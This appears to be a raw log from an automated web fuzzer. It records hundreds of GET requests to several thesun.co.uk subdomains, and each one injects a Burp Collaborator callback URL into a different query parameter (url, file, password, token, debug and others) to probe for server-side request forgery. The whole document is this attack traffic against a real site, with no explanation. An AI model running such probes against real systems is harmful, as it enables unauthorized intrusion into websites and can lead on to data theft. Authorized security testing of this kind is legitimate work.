2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?device=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?proxy=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?demo=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?since=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?cms=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?deletefile=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?wysiwyg=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?runtests=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?phrase=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?score=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?noajax=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?langCode=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?userID=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?cropDetails=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?connection=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?iDisplayStart=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?word=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?newName=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?genre=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?font=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?regex=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?unfoldmenu=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?dst=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?startDate=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?eid=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?minute=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?attributes=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?From=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?collation=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?emails=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?oid=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?unsort=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?newpassword=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?mac=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?standalone=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?points=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?oldpassword=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?uninstall=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?published=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?actions=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:03 Get "http://cmp.thesun.co.uk?support=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?q=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?step=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?name=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?t=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?action=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?submit=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?search=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?s=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?user=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?username=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?c=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?key=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?code=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?post=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?delete=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?ajax=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?charset=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?p=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?message=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?mode=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?description=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?data=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?state=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?login=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?file=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?excerpt=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?title=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?page=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?comment=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?status=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?start=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?content=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?debug=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?email=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?url=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?token=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?id=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?lang=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?type=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?password=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:04 Get "http://codes.thesun.co.uk?order=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?mode=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?file=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?excerpt=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?page=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?login=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?user=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?t=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?search=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?submit=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?p=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?title=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?token=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?ajax=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?email=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?id=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?password=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?content=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?state=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?type=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?delete=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?post=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?url=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?order=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?description=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?message=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?charset=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?data=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?name=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?s=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?step=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?comment=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?debug=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?key=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?start=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?action=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?status=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?q=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?username=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?lang=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?c=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://cmp.cdn.thesun.co.uk?code=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?q=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?comment=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?type=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?s=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?content=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?url=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?post=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?login=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?mode=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?title=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?id=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?c=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?action=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?start=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?charset=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?user=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?state=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?page=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?email=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?ajax=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?token=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?description=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?code=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?t=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?file=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?debug=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?username=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?excerpt=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?name=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?message=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?key=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?lang=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?p=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?password=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?submit=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?step=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?data=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?search=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?order=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?delete=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "http://comps.thesun.co.uk?status=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?content=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?s=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?id=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?user=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?comment=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?action=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?description=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?data=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?start=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?message=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?page=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?url=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?username=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?status=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?email=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?type=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?delete=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?ajax=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?debug=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?password=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?file=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:06 Get "https://click.email.thesun.co.uk?state=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?code=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?step=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?name=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?p=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?submit=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?q=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?search=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?login=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?post=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?lang=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
2021/04/17 16:09:05 Get "https://click.email.thesun.co.uk?key=http://hez0kgfv7rvym98k65ggntsp6gcb00.burpcollaborator.net": context canceled
